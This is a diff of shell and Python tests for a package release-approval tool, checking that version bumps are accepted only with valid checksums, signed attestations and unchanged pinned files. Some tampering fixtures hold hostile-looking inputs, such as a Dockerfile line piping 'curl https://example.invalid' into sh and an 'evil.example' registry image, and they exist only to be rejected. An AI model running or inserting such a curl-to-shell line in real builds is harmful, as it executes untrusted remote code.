+	BASE_MANIFEST=$(jq -c '.upstreamLicense.url = "https://example.invalid/blob/v3.39.87/LICENSE"' <<<"$BASE_MANIFEST")
+	HEAD_MANIFEST=$(jq -c '.upstreamLicense.url = "https://example.invalid/blob/v3.39.114/LICENSE"' <<<"$HEAD_MANIFEST")
+	BASE_DOCKERFILE=$'FROM base@sha256:abc\nARG APP_SHA256='"${S_OLD}"$'\nARG AIDEVOPS_VERSION=3.39.87\n'
+	HEAD_DOCKERFILE=$'FROM base@sha256:abc\nARG APP_SHA256='"${S_NEW}"$'\nARG AIDEVOPS_VERSION=3.39.114\n'
+	sum_filter=".pin_proof = {checksum:{repository:\"upstream/project\",asset:\"checksums.txt\",file:\"app_3.39.114_linux_amd64\",version:\"3.39.114\",sha256:\"$S_NEW\"}}"
+	assert_routine routine 'release checksum and license URL' "$sum_filter"
+	start_filter='.policy.pinned_files += ["start.sh"] | .files += [{filename:"start.sh",status:"modified"}] | .contents["start.sh"] = {base:("APP_VERSION=3.39.87\n" | @base64),head:("APP_VERSION=3.39.114\n" | @base64)}'
+	assert_routine routine 'checksum with version-only second pinned file' "$sum_filter | $start_filter"
+	assert_routine not 'checksum second pinned file tampering' "$sum_filter | $start_filter | .contents[\"start.sh\"].head = (\"APP_VERSION=3.39.114\nRUN_UNTRUSTED=1\n\" | @base64)" 'pinned file changes beyond version substitution'
+	assert_routine not 'checksum ARG removed' "$sum_filter | $(dockerfile_head $'FROM base@sha256:abc\nARG AIDEVOPS_VERSION=3.39.114\n')" 'release_checksum'
+	assert_routine not 'checksum unpublished' "$sum_filter | .pin_proof.checksum.sha256 = \"$S_BAD\"" 'release_checksum'
+	assert_routine not 'checksum wrong file' "$sum_filter | .pin_proof.checksum.file = \"app_3.39.114_linux_arm64\"" 'release_checksum proof mismatch'
+	assert_routine not 'checksum wrong asset' "$sum_filter | .pin_proof.checksum.asset = \"other.txt\"" 'release_checksum proof mismatch'
+	assert_routine not 'checksum for old version' "$sum_filter | .pin_proof.checksum.version = \"3.39.87\" | .pin_proof.checksum.file = \"app_3.39.87_linux_amd64\"" 'new upstream version'
+	assert_routine not 'checksum proof missing' "$sum_filter | del(.pin_proof)" 'pin proof is missing'
+	assert_routine not 'checksum extra Dockerfile line' "$sum_filter | $(dockerfile_head "${HEAD_DOCKERFILE}"$'RUN curl https://example.invalid | sh\n')" 'pinned file changes beyond version substitution'
+	assert_routine not 'license URL not opted in' "$sum_filter | del(.policy.license_version_url)" 'manifest changes beyond'
+	assert_routine not 'license URL other substitution' "$sum_filter | $(manifest_head "${HEAD_MANIFEST/v3.39.114/v9.9.9}")" 'manifest changes beyond'
+	assert_routine not 'license metadata changed' "$sum_filter | $(manifest_head "${HEAD_MANIFEST/MIT/Apache}")" 'manifest changes beyond'
+)
+# Main-build suffixes cannot borrow tag authority; the documented migration
+# needs one per-release signature before strict-tag routine bumps can start.
+assert_routine not 'Buzz main-build cannot use a tag finding' "$(manifest_base '{"version":"0.1.43","upstreamVersion":"0.5.28-main.2cd40ba"}') | $(manifest_head '{"version":"0.1.44","upstreamVersion":"0.5.29"}') | .finding_upstream = \"0.5.29\"" 'base upstreamVersion must be X.Y.Z'
+assert_routine routine 'Buzz after signed strict-tag migration' "del(.files[3,4]) | $(manifest_base '{"version":"0.1.43","upstreamVersion":"0.5.28"}') | $(manifest_head '{"version":"0.1.44","upstreamVersion":"0.5.29"}') | .finding_upstream = \"0.5.29\""
+
+# GH#38807: exercise the real predicate and collector without network or package
+# execution. Verified gh results are trusted caller input, never PR contents.
+python3 - "$SOURCE_DIR" <<'PY'
+import base64
+import copy
+import hashlib
+import json
+import subprocess
+import sys
+from unittest.mock import patch
+
+sys.path.insert(0, sys.argv[1])
+import cloudron_companion_image as companion
+from cloudron_routine_bump import check, NotRoutine, validate_pins_request
+
+old, new, pin, floor = (char * 40 for char in "1234")
+digest, platform = ("sha256:" + char * 64 for char in "ab")
+image = "ghcr.io/block/buzz"
+spec = dict(image=image, source_repository="block/buzz", source_branch="main", tag_prefix="sha-",
+            platform="linux/amd64", pin_file="src-tauri/Cargo.toml",
+            pin_pattern=r'^buzz-audio-client = .*rev = "([0-9a-f]{40})"', floor_revisions=[floor],
+            verify_file="test/verify-buzz-image.sh",
+            verify_constants=dict(BUZZ_APP_RELEASE="release_tag", BUZZ_APP_RELAY_REVISION="pin",
+                                  BUZZ_REVISION="image_revision", BUZZ_IMAGE="image_ref",
+                                  BUZZ_INDEX_DIGEST="index_digest", BUZZ_AMD64_DIGEST="platform_digest"))
+policy = dict(schema=1, kind="cloudron-standing-upstream-release", repository="owner/app",
+              changelog_files=["CHANGELOG"], pinned_files=["Dockerfile"], check_files=[],
+              upstream_repository="block/buzz-app", companion_image=spec)
+validate_pins_request({key: policy[key] for key in ("upstream_repository", "companion_image")})
+
+def ancestry(commit):
+    return dict(status="ahead", merge_base_commit=dict(sha=commit))
+
+def attestation(subject=digest, revision=new):
+    cert = dict(issuer="https://token.actions.githubusercontent.com",
+                sourceRepositoryURI="https://github.com/block/buzz", sourceRepositoryDigest=revision,
+                sourceRepositoryRef="refs/heads/main", buildSignerDigest=revision,
+                buildSignerURI="https://github.com/block/buzz/.github/workflows/build.yml@refs/heads/main")
+    return [dict(verificationResult=dict(signature=dict(certificate=cert), statement=dict(
+        predicateType="https://slsa.dev/provenance/v1", subject=[dict(name=image, digest=dict(sha256=subject[7:]))])))]
+
+def encoded(text):
+    return base64.b64encode(text.encode()).decode()
+
+def contents(base, head):
+    return dict(base=encoded(base), head=encoded(head))
+
+def docker(revision):
+    return "FROM --platform=linux/amd64 " + image + ":sha-" + revision[:7] + "@" + digest + "\nARG UNRELATED=1\n"
+
+def verify(revision, release):
+    values = dict(release_tag=release, pin=pin, image_revision=revision,
+                  image_ref=image + ":sha-" + revision[:7],
+                  index_digest=digest, platform_digest=platform)
+    return "#!/bin/bash\n" + "".join('readonly ' + name + '="' + values[key] + '"\n'
+                                   for name, key in spec["verify_constants"].items()) + 'readonly BUZZ_NIP_CL_REVISION="' + floor + '"\nexit 0\n'
+
+proof = dict(release_tag="v1.0.5", release_commit=new, pin_text='buzz-audio-client = { rev = "' + pin + '" }',
+             source_repository="block/buzz", image_revision=new, old_revision=old, branch=ancestry(new),
+             ancestors={commit: ancestry(commit) for commit in (pin, floor, old)},
+             index_digest=digest, platform_digest=platform, label_revision=new, attestations=attestation())
+doc = dict(policy=policy, finding_upstream="1.0.5", companion_proof=proof,
+           release_proof=dict(repository="block/buzz-app", old_commit=old, new_commit=new, status="ahead", merge_base=old),
+           files=[dict(filename=name, status="modified", additions=1, deletions=0)
+                  for name in ("CloudronManifest.json", "Dockerfile", "CHANGELOG", spec["verify_file"])],
+           contents={"CloudronManifest.json": contents('{"version":"0.1.1","upstreamVersion":"1.0.4"}',
+                                                     '{"version":"0.1.2","upstreamVersion":"1.0.5"}'),
+                     "Dockerfile": contents(docker(old), docker(new)),
+                     spec["verify_file"]: contents(verify(old, "v1.0.4"), verify(new, "v1.0.5"))})
+assert check(doc, "owner/app")
+print("PASS companion: synthetic Buzz 1.0.4 -> 1.0.5")
+
+def reject(label, mutate, reason):
+    candidate = copy.deepcopy(doc)
+    mutate(candidate)
+    try:
+        check(candidate, "owner/app")
+    except NotRoutine as error:
+        assert reason in str(error), (label, str(error))
+    else:
+        raise AssertionError("accepted " + label)
+    print("PASS companion rejection: " + label)
+
+for key, label in ((pin, "release pin"), (floor, "floor"), (old, "old image")):
+    reject(label, lambda d, key=key: d["companion_proof"]["ancestors"][key].update(status="behind"), "is not an ancestor")
+reject("image off main", lambda d: d["companion_proof"]["branch"].update(status="diverged"), "image on source branch")
+reject("registry digest", lambda d: d["companion_proof"].update(index_digest=platform), "registry digest mismatch")
+reject("label mismatch", lambda d: d["companion_proof"].update(label_revision=old), "config revision label")
+reject("missing attestation", lambda d: d["companion_proof"].update(attestations=[]), "verified attestation")
+reject("unverified bundle", lambda d: d["companion_proof"].update(attestations=[{"bundle":attestation()}]), "verified attestation")
+reject("wrong artifact", lambda d: d["companion_proof"].update(attestations=attestation("sha256:" + "c" * 64)), "verified attestation")
+reject("wrong attestation source", lambda d: d["companion_proof"].update(attestations=attestation(revision=old)), "verified attestation")
+reject("wrong signer branch", lambda d: d["companion_proof"]["attestations"][0]["verificationResult"]["signature"]["certificate"].update(buildSignerURI="https://github.com/block/buzz/.github/workflows/build.yml@refs/heads/other"), "verified attestation")
+reject("preview", lambda d: d["contents"]["CloudronManifest.json"].update(head=encoded('{"version":"0.1.2","upstreamVersion":"1.0.5-preview.2"}')), "must be X.Y.Z")
+reject("duplicate upstream pin", lambda d: d["companion_proof"].update(pin_text=proof["pin_text"] + "\n" + proof["pin_text"]), "exactly one upstream pin")
+reject("release downgrade", lambda d: d["release_proof"].update(status="behind"), "strictly ahead")
+reject("changed floor constant", lambda d: d["contents"][spec["verify_file"]].update(head=encoded(verify(new, "v1.0.5").replace(floor, old))), "extra verify_file edit")
+reject("extra verifier command", lambda d: d["contents"][spec["verify_file"]].update(head=encoded(verify(new, "v1.0.5") + "id\n")), "extra verify_file edit")
+reject("wrong proven constant", lambda d: d["contents"][spec["verify_file"]].update(head=encoded(verify(old, "v1.0.5"))), "verify constant")
+reject("unrelated ARG", lambda d: d["contents"]["Dockerfile"].update(head=encoded(docker(new).replace("UNRELATED=1", "UNRELATED=2"))), "pinned file changes")
+reject("catalog checksum remains non-routine", lambda d: d["files"].append(dict(filename="test/published-catalog-manifests.sha256",status="modified")), "outside the standing policy")
+
+# GH#38854: opt-in catalog append composes with the full Buzz companion proof.
+baseline_path = "test/published-catalog-manifests.sha256"
+baseline_digest = "e" * 64
+baseline_base = "0.1.0 " + "f" * 64 + "\n"
+baseline_line = "0.1.1 " + baseline_digest + "\n"
+doc["policy"]["catalog_baseline"] = dict(file=baseline_path)
+validate_pins_request(dict(catalog_baseline=dict(file=baseline_path)))
+assert check(doc, "owner/app")  # Unchanged baseline requires no proof or catalog read.
+doc["files"].append(dict(filename=baseline_path, status="modified"))
+doc["contents"][baseline_path] = contents(baseline_base, baseline_base + baseline_line)
+doc["catalog_baseline_proof"] = dict(version="0.1.1", sha256=baseline_digest)
+assert check(doc, "owner/app")
+print("PASS catalog_baseline: verified append with synthetic Buzz 1.0.4 -> 1.0.5")
+reject("baseline missing proof", lambda d: d.pop("catalog_baseline_proof"), "catalog_baseline: missing proof")
+reject("baseline proof version", lambda d: d["catalog_baseline_proof"].update(version="0.1.2"), "catalog_baseline: proof version")
+reject("baseline malformed digest", lambda d: d["catalog_baseline_proof"].update(sha256="bad"), "catalog_baseline: invalid proof")
+reject("baseline unterminated base", lambda d: d["contents"][baseline_path].update(base=encoded(baseline_base.rstrip("\n"))), "catalog_baseline: base lacks trailing newline")
+for key in ("changelog_files", "pinned_files", "check_files"):
+    reject("baseline overlaps " + key, lambda d, key=key: d["policy"][key].append(baseline_path), "catalog_baseline:")
+for label, text in (("wrong digest", baseline_base + baseline_line.replace("e", "a")),
+                    ("wrong version", baseline_base + baseline_line.replace("0.1.1", "0.1.2")),
+                    ("two lines", baseline_base + baseline_line * 2),
+                    ("earlier edit", baseline_base.replace("f", "a") + baseline_line),
+                    ("missing newline", (baseline_base + baseline_line).rstrip("\n")),
+                    ("extra newline", baseline_base + baseline_line + "\n")):
+    reject("baseline " + label, lambda d, text=text: d["contents"][baseline_path].update(head=encoded(text)), "catalog_baseline:")
+for path in ("../baseline", "/baseline", "CloudronManifest.json", "CloudronVersions.json", "Dockerfile", "CHANGELOG", spec["verify_file"]):
+    reject("baseline invalid or overlapping " + path,
+           lambda d, path=path: d["policy"]["catalog_baseline"].update(file=path), "catalog_baseline:")
+for invalid in (None, {}, {"file": baseline_path, "extra": True}, {"file": []},
+                {"file": "Dockerfile"}, {"file": "CHANGELOG"}, {"file": "test/package-test.sh"}):
+    try:
+        validate_pins_request(dict(catalog_baseline=invalid))
+    except NotRoutine as error:
+        assert "catalog_baseline:" in str(error)
+    else:
+        raise AssertionError("accepted malformed baseline policy")
+
+def with_identity(candidate):
+    candidate["policy"].update(release_identity=dict(commit_arg="APP_COMMIT"), registry_images=[image])
+    candidate["release_proof"].update(asset=None, digests=[])
+    candidate["pin_proof"] = dict(registry={})
+
+reject("image-only change cannot skip signed commit ARG", with_identity, "pinned file changes")
+
+def with_checksum(candidate):
+    candidate["policy"]["release_checksum"] = dict(arg="APP_SHA256", asset="checksums.txt", file="app_{version}")
+    candidate["pin_proof"] = dict(checksum=dict(repository="block/buzz-app", asset="checksums.txt",
+                                               file="app_1.0.5", version="1.0.5", sha256="c" * 64))
+
+reject("image-only change cannot skip signed checksum ARG", with_checksum, "pinned file changes")
+unchanged = copy.deepcopy(doc)
+unchanged["contents"]["Dockerfile"]["base"] = encoded(docker(new))
+unchanged["companion_proof"]["old_revision"] = new
+unchanged["companion_proof"]["ancestors"][new] = dict(status="identical",merge_base_commit=dict(sha=new))
+unchanged["files"] = [entry for entry in unchanged["files"] if entry["filename"] != "Dockerfile"]
+assert check(unchanged, "owner/app")
+platform_attestation = copy.deepcopy(doc)
+platform_attestation["companion_proof"]["attestations"] = attestation(platform)
+assert check(platform_attestation, "owner/app")
+print("PASS companion: unchanged image and platform attestation")
+
+# Collector integration: stub process and registry boundaries, not the collector.
+calls = []
+def process(args, **kwargs):
+    args = (args[0].rsplit("/", 1)[-1], *args[1:])
+    calls.append(args)
+    if args[:2] == ("gh", "api"):
+        endpoint = args[2]
+        assert endpoint.startswith(("repos/block/buzz/", "repos/block/buzz-app/")), endpoint
+        if "/contents/" in endpoint:
+            assert endpoint.endswith("?ref=" + new)
+            value = dict(content=encoded(proof["pin_text"]))
+        elif "/compare/" in endpoint:
+            value = ancestry(endpoint.split("/compare/")[1].split("...")[0])
+        elif "/git/ref/" in endpoint:
+            value = dict(object=dict(sha=new))
+        else:
+            value = dict(sha=old if endpoint.endswith(old[:7]) else new)
+    elif args[:3] == ("gh", "attestation", "verify"):
+        value = attestation()
+    else:
+        value = dict(token="anonymous-test-token")
+    return subprocess.CompletedProcess(args, 0, stdout=json.dumps(value), stderr="")
+
+def registry(spec_arg, token, kind, object_digest):
+    assert spec_arg == spec and token == "anonymous-test-token"
+    return {digest:dict(manifests=[dict(platform=dict(os="linux",architecture="amd64"),digest=platform)]),
+            platform:dict(config=dict(digest="sha256:" + "c" * 64)),
+            "sha256:" + "c" * 64:dict(config=dict(Labels={"org.opencontainers.image.revision":new}))}[object_digest]
+
+with patch.object(companion.subprocess, "run", side_effect=process), patch.object(companion, "registry_json", side_effect=registry):
+    collected = companion.collect(doc, digest)
+    assert check(dict(doc, companion_proof=collected), "owner/app")
+    assert any(args[:3] == ("gh", "attestation", "verify") for args in calls)
+print("PASS companion: signed-source collector integration")
+
+def failed_verifier(args, **kwargs):
+    args = (args[0].rsplit("/", 1)[-1], *args[1:])
+    if args[:3] == ("gh", "attestation", "verify"):
+        # Even plausible JSON must not be consumed after failed verification.
+        return subprocess.CompletedProcess(args, 1, stdout=json.dumps(attestation()), stderr="unverified")
+    return process(args, **kwargs)
+
+with patch.object(companion.subprocess, "run", side_effect=failed_verifier), patch.object(companion, "registry_json", side_effect=registry):
+    try:
+        companion.collect(doc, digest)
+    except NotRoutine as error:
+        assert "missing verified attestation" in str(error)
+    else:
+        raise AssertionError("accepted failed gh signature verification")
+
+def duplicate_platform(spec_arg, token, kind, object_digest):
+    value = registry(spec_arg, token, kind, object_digest)
+    if object_digest == digest:
+        value["manifests"] *= 2
+    return value
+
+with patch.object(companion.subprocess, "run", side_effect=process), patch.object(companion, "registry_json", side_effect=duplicate_platform):
+    try:
+        companion.collect(doc, digest)
+    except NotRoutine as error:
+        assert "expected one platform manifest" in str(error)
+    else:
+        raise AssertionError("accepted ambiguous platform")
+
+payload = b'{"config":{"Labels":{}}}'
+object_digest = "sha256:" + hashlib.sha256(payload).hexdigest()
+with patch.object(companion.subprocess, "run", return_value=subprocess.CompletedProcess([], 0, stdout=payload)) as curl:
+    assert companion.registry_json(spec, "anonymous-test-token", "blobs", object_digest) == json.loads(payload)
+    assert "-fsSL" in curl.call_args.args[0]  # GHCR blobs may redirect to content storage.
+    try:
+        companion.registry_json(spec, "anonymous-test-token", "blobs", digest)
+    except NotRoutine as error:
+        assert "registry object digest mismatch" in str(error)
+    else:
+        raise AssertionError("accepted registry body with a different digest")
+print("PASS companion: failed signatures, ambiguous platforms and content-addressed registry reads")
+PY
+
 # GH#37697: release_policy_authorizes plumbing against stubbed GitHub reads.
 (
 	# shellcheck source=../cloudron-release-approval-helper.sh
 	source "${SOURCE_DIR}/cloudron-release-approval-helper.sh"
 	SCRIPT_DIR="$SOURCE_DIR"
+	# Exercise the real CLI preview without network access or policy mutation.
+	preview=$(main policy-request owner/app --zero-minor-routine --dry-run) || exit 1
+	preview_policy=$(release_policy_metadata "$preview" owner/app) || exit 1
+	jq -e '.zero_minor == "routine"' <<<"$preview_policy" >/dev/null || exit 1
+	[[ "$preview" == *'0.x minor upstream releases are routine'* && "$preview" == *'new policy signature'* ]] || exit 1
+	default_preview=$(main policy-request owner/app --dry-run) || exit 1
+	default_policy=$(release_policy_metadata "$default_preview" owner/app) || exit 1
+	jq -e 'has("zero_minor") | not' <<<"$default_policy" >/dev/null || exit 1
+	for mode in commits commits-license-url; do
+		! main policy-request owner/app "$mode" up/proj --zero-minor-routine --dry-run >/dev/null || exit 1
+	done
+	(
+		release_policy_request() {
+			local repo="$1" mode="$2" upstream="$3" zero_minor="$4"
+			[[ "$repo" == owner/app && "$mode" == semver && -z "$upstream" && "$zero_minor" == true ]] || return 1
+			return 0
+		}
+		main policy-request owner/app --zero-minor-routine
+	) || exit 1
+	printf 'PASS zero-minor policy CLI preview and request forwarding\n'
+	# GH#38739: the pins policy mode signs validated JSON and rejects anything else.
+	PINS_JSON='{"upstream_repository":"up/proj","registry_images":["ghcr.io/up/svc"],"release_identity":{"commit_arg":"APP_COMMIT"},"release_checksum":{"arg":"APP_SHA256","asset":"checksums.txt","file":"app_{version}_linux_amd64"},"license_version_url":true}'
+	pins_body=$(release_policy_body owner/app cmd pins "$PINS_JSON") || { printf 'FAIL pins policy body\n'; exit 1; }
+	[[ "$pins_body" == *'"registry_images":["ghcr.io/up/svc"]'* && "$pins_body" == *'Upstream pin policy'* ]] || { printf 'FAIL pins policy content\n'; exit 1; }
+	for bad in '{"upstream_repository":"up/proj","registry_images":["evil.example/a/b"]}' '{"upstream_repository":"up/proj","license_version_url":false}' '{"upstream_repository":"up/proj","surprise":1}' '{"upstream_repository":"up/proj"}' '{"upstream_repository":"up/proj","release_identity":{"commit_arg":"APP_COMMIT"}}' '{"upstream_repository":"up/proj","registry_images":[{}]}' '{"release_identity":null}' '{"registry_images":null}' '{"release_checksum":null}' '{"license_version_url":true,"release_identity":null}'; do
+		! release_policy_body owner/app cmd pins "$bad" >/dev/null || { printf 'FAIL pins policy accepted %s\n' "$bad"; exit 1; }
+	done
+	printf 'PASS pins policy body validation\n'
 	BASE_SHA=cccccccccccccccccccccccccccccccccccccccc
 	MAIN_SHA=dddddddddddddddddddddddddddddddddddddddd
 	policy_issue_json() {
 		local number="$1" author="$2" repo="${3:-owner/app}"
 		jq -cn --argjson number "$number" --arg author "$author" \
-			--arg body "$(release_policy_body "$repo" "Maintainer command: \`sudo aidevops approve issue ${number} ${repo}\`")" \
+			--arg body "$(release_policy_body "$repo" "Maintainer command: \`sudo aidevops approve issue ${number} ${repo}\`" "${POLICY_MODE:-semver}" "${POLICY_UPSTREAM:-}")" \
 			'{number: $number, html_url: ("https://example.invalid/issue/" + ($number | tostring)), author_association: $author, body: $body,
 			  state: "open", closed_at: null, updated_at: "2026-11-11T00:00:00Z", labels: [{name: "release-standing-policy"}]}'
 		return 0
@@ -944,6 +1523,15 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 		"Dockerfile@${HEAD_SHA}") b64 "$docker" ;;
 		"test/package-test.sh@${BASE_SHA}") b64 "$BASE_CHECK" ;;
 		"test/package-test.sh@${HEAD_SHA}") b64 "$check" ;;
+		"CloudronVersions.json@${BASE_SHA}")
+			if [[ "$POLICY_CASE" == baseline_unpublished ]]; then
+				b64 '{"versions":{"0.1.43":{"publishState":"pending","manifest":{"z":1,"a":2}}}}'
+			else
+				b64 '{"versions":{"0.1.43":{"publishState":"published","manifest":{"z":1,"a":2}}}}'
+			fi
+			;;
+		"test/published-catalog-manifests.sha256@${BASE_SHA}") b64 $'0.1.42 previous\n' ;;
+		"test/published-catalog-manifests.sha256@${HEAD_SHA}") b64 $'0.1.42 previous\n0.1.43 '"${BASELINE_DIGEST}"$'\n' ;;
 		*) return 1 ;;
 		esac
 		printf '\n'
@@ -982,8 +1570,23 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 			;;
 		'pr view') jq -cn --arg head "$HEAD_SHA" '{closingIssuesReferences: [{number: 30}], headRefOid: $head}' ;;
 		'api repos/owner/app/issues/30')
-			jq -cn --arg scenario "$POLICY_CASE" '{state: (if $scenario == "finding_closed" then "closed" else "open" end), author_association: "OWNER",
+			if [[ "${POLICY_MODE:-semver}" == commits || "$POLICY_CASE" == mode_mismatch ]]; then
+				jq -cn --arg sha "$NEW_UPSTREAM" --arg scenario "$POLICY_CASE" '{state:"open",author_association:"OWNER",
+				 body:("Finding\n<!-- aidevops:cloudron-package-monitor upstream-commit-" + $sha + " -->\nUpstream `" + (if $scenario == "commit_wrong_repo" then "other/project" else "upstream/project" end) + "` branch `main` head is `" + $sha + "` (date): update")}'
+			else
+				jq -cn --arg scenario "$POLICY_CASE" '{state: (if $scenario == "finding_closed" then "closed" else "open" end), author_association: "OWNER",
 				body: "Finding\n<!-- aidevops:cloudron-package-monitor upstream-v3.39.114 -->\n"}'
+			fi
+			;;
+		'api repos/upstream/project/commits/1234567')
+			[[ "$POLICY_CASE" != commit_api_error ]] || return 1
+			printf '%s\n' "$OLD_UPSTREAM"
+			;;
+		'api repos/upstream/project/commits/abcdef1')
+			if [[ "$POLICY_CASE" == commit_resolved_mismatch ]]; then printf '%s\n' "$OLD_UPSTREAM"; else printf '%s\n' "$NEW_UPSTREAM"; fi
+			;;
+		"api repos/upstream/project/compare/${OLD_UPSTREAM}...${NEW_UPSTREAM}")
+			jq -cn --arg base "$OLD_UPSTREAM" --arg scenario "$POLICY_CASE" '{status:(if $scenario == "commit_diverged" then "diverged" else "ahead" end), merge_base_commit:{sha:$base}}'
 			;;
 		"api repos/owner/app/compare/${MAIN_SHA}...${HEAD_SHA}")
 			jq -cn --arg base "$BASE_SHA" --arg scenario "$POLICY_CASE" '{merge_base_commit: {sha: $base},
@@ -991,7 +1594,9 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 				         {filename: "CloudronManifest.json", status: "modified", additions: 2, deletions: 2},
 				         {filename: "Dockerfile", status: "modified", additions: 2, deletions: 2},
 				         {filename: "test/package-test.sh", status: "modified", additions: 6, deletions: 4}]
-				        + if $scenario == "extra_file" then [{filename: "start.sh", status: "modified", additions: 1, deletions: 0}] else [] end)}'
+				        + if $scenario == "extra_file" then [{filename: "start.sh", status: "modified", additions: 1, deletions: 0}]
+				          elif ($scenario | startswith("baseline_")) then [{filename:"test/published-catalog-manifests.sha256",status:"modified",additions:1,deletions:0}]
+				          else [] end)}'
 			;;
 		'api repos/owner/app/contents/'*) policy_contents_stub "${target#repos/owner/app/contents/}" || return 1 ;;
 		'api repos/owner/app/labels?per_page=100') printf 'bug\n' ;;
@@ -1038,6 +1643,8 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 	assert_policy verified 0
 	# The compare base is the resolved main SHA, never the bare branch name.
 	grep -q "^gh api repos/owner/app/compare/${MAIN_SHA}\.\.\.${HEAD_SHA}\$" "${TEST_ROOT}/calls"
+	assert_policy mode_mismatch 1
+	grep -q 'standing policy #50 does not apply (policy mode semver vs finding upstream-commit-' "${TEST_ROOT}/policy-err"
 	assert_policy docker_tamper 1
 	grep -q 'pinned file changes beyond version substitution' "${TEST_ROOT}/policy-err"
 	assert_policy check_tamper 1
@@ -1058,6 +1665,35 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 	assert_policy other_repo 1
 	assert_policy none 1
 	assert_policy verified 1 "$OTHER_SHA"
+	(
+		POLICY_MODE=pins
+		POLICY_UPSTREAM='{"catalog_baseline":{"file":"test/published-catalog-manifests.sha256"}}'
+		BASELINE_DIGEST=$(printf '{"a":2,"z":1}\n' | shasum -a 256)
+		BASELINE_DIGEST="${BASELINE_DIGEST%% *}"
+		assert_policy baseline_published 0
+		grep -Fq "gh api repos/owner/app/contents/CloudronVersions.json?ref=${BASE_SHA}" "${TEST_ROOT}/calls"
+		if grep -Fq "CloudronVersions.json?ref=${HEAD_SHA}" "${TEST_ROOT}/calls"; then exit 1; fi
+		assert_policy baseline_unpublished 1
+		assert_policy verified 0
+		if grep -Fq 'contents/CloudronVersions.json' "${TEST_ROOT}/calls"; then exit 1; fi
+	)
+
+	(
+		POLICY_MODE=commits
+		POLICY_UPSTREAM=upstream/project
+		BASE_MANIFEST="${BASE_MANIFEST//3.39.87/1234567}"
+		HEAD_MANIFEST="${HEAD_MANIFEST//3.39.114/abcdef1}"
+		BASE_DOCKERFILE="${BASE_DOCKERFILE//3.39.87/1234567}"
+		HEAD_DOCKERFILE="${HEAD_DOCKERFILE//3.39.114/abcdef1}"
+		BASE_CHECK="${BASE_CHECK//3.39.87/1234567}"
+		HEAD_CHECK="${HEAD_CHECK//3.39.114/abcdef1}"
+		assert_policy commit_ahead 0
+		grep -Fq "gh api repos/upstream/project/compare/${OLD_UPSTREAM}...${NEW_UPSTREAM}" "${TEST_ROOT}/calls"
+		assert_policy commit_diverged 1
+		assert_policy commit_wrong_repo 1
+		assert_policy commit_resolved_mismatch 1
+		assert_policy commit_api_error 1
+	)
 
 	gh_create_issue() {
 		local body=""
@@ -1069,8 +1705,12 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 	}
 	gh_issue_edit_safe() {
 		local body=""
+		if [[ "$*" == '50 --repo owner/app --remove-label persistent' ]]; then
+			printf 'issue-edit %s\n' "$*" >>"${TEST_ROOT}/calls"
+			return 0
+		fi
 		body=$(</dev/stdin)
-		[[ "$*" == '50 --repo owner/app --body-file -' ]] || return 9
+		[[ "$*" == '50 --repo owner/app --body-file -' || "$*" == '51 --repo owner/app --body-file -' ]] || return 9
 		printf '%s\n' "$body" >"${TEST_ROOT}/policy-body"
 		printf 'issue-edit %s\n' "$*" >>"${TEST_ROOT}/calls"
 		return 0
@@ -1082,8 +1722,9 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 	export POLICY_CASE=create
 	: >"${TEST_ROOT}/calls"
 	[[ "$(release_policy_request owner/app)" == "$expected_policy_output" ]]
-	grep -q -- '--label release-standing-policy --label no-auto-dispatch' "${TEST_ROOT}/calls"
+	grep -q -- '--label release-standing-policy --label persistent --label no-auto-dispatch' "${TEST_ROOT}/calls"
 	grep -q '^gh label create release-standing-policy --repo owner/app ' "${TEST_ROOT}/calls"
+	grep -q '^gh label create persistent --repo owner/app ' "${TEST_ROOT}/calls"
 	[[ "$(release_policy_metadata "$(<"${TEST_ROOT}/policy-body")" owner/app)" == "$POLICY_JSON" ]]
 	# shellcheck disable=SC2016 # Markdown command backticks are literal.
 	grep -q 'Maintainer command: `sudo aidevops approve issue 50 owner/app`' "${TEST_ROOT}/policy-body"
@@ -1099,6 +1740,57 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 	[[ "$(release_policy_request owner/app)" == "$expected_policy_output" ]]
 	grep -q '^issue-edit 50 ' "${TEST_ROOT}/calls"
 	printf 'PASS interrupted unsigned policy request is finalized\n'
+	export POLICY_CASE=create
+	: >"${TEST_ROOT}/calls"
+	[[ "$(release_policy_request owner/app commits upstream/project)" == "$expected_policy_output" ]]
+	release_policy_metadata "$(<"${TEST_ROOT}/policy-body")" owner/app |
+		jq -e '.upstream_mode == "commits" and .upstream_repository == "upstream/project"' >/dev/null
+	grep -q 'commits have no major boundary' "${TEST_ROOT}/policy-body"
+	grep -q 'Maintainer command:' "${TEST_ROOT}/policy-body"
+	printf 'PASS commit policy creation records the signed upstream, ancestry rule and signing command\n'
+	# Migration may finalize an unsigned policy, but must never edit a signed,
+	# stale or unverifiable legacy semver policy to expand its authorization.
+	for POLICY_CASE in verified stale api_error; do
+		export POLICY_CASE
+		: >"${TEST_ROOT}/calls"
+		if release_policy_request owner/app commits upstream/project 2>/dev/null; then exit 1; fi
+		if grep -q '^issue-edit ' "${TEST_ROOT}/calls"; then exit 1; fi
+	done
+	export POLICY_CASE=unsigned
+	: >"${TEST_ROOT}/calls"
+	[[ "$(release_policy_request owner/app commits upstream/project)" == "$expected_policy_output" ]]
+	grep -q '^issue-edit 50 ' "${TEST_ROOT}/calls"
+	release_policy_metadata "$(<"${TEST_ROOT}/policy-body")" owner/app |
+		jq -e '.upstream_mode == "commits" and .upstream_repository == "upstream/project"' >/dev/null
+	printf 'PASS only an unsigned legacy policy can be finalized as a new commit policy for signing\n'
+	# GH#39805: a signed policy is only replaced with --supersede.
+	eval "$(declare -f gh | sed '1s/^gh/gh_policy_stub/')"
+	gh() {
+		if [[ "${1:-}" == issue && "${2:-}" == close ]]; then
+			printf 'gh %s\n' "$*" >>"${TEST_ROOT}/calls"
+			return 0
+		fi
+		gh_policy_stub "$@"
+	}
+	export POLICY_CASE=verified
+	: >"${TEST_ROOT}/calls"
+	refusal=$(release_policy_request owner/app semver '' true 2>&1) && exit 1
+	[[ "$refusal" == *'--supersede'* ]] || exit 1
+	if grep -Eq '^(create |issue-edit )|issue close' "${TEST_ROOT}/calls"; then exit 1; fi
